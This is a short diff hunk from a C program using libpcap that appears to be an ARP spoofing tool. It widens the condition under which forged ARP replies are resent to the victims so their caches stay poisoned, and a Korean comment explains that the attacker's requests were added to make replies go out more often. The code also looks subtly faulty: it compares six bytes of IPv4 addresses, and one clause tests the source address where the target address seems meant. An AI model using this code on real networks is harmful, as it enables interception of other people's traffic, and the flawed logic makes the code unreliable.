@@ -275,8 +275,8 @@ int main(int argc, char* argv[]) {
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender&target's request packet for recovery
                                                                 // attacker arp_request는 필요없는데 자주 보낼려고 추가함
       && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
-      &&(!memcmp(arp->spa , ip_sender , 6) || !memcmp(arp->spa , ip_attacker ,6))
-      &&!memcmp(arp->tpa , ip_target , 6))
+      &&(!memcmp(arp->spa , ip_sender , 6) || !memcmp(arp->spa , ip_attacker ,6) || !memcmp(arp->spa , ip_target ,6))
+      &&(!memcmp(arp->tpa , ip_target , 6) || !memcmp(arp->tpa , ip_attacker ,6) || !memcmp(arp->spa , ip_sender ,6)))
     {
       printf("send arp reply packet to sender&target against recovery\n");
       pcap_sendpacket(handle ,(unsigned char*)arp_reply_sender_packet , 42);   
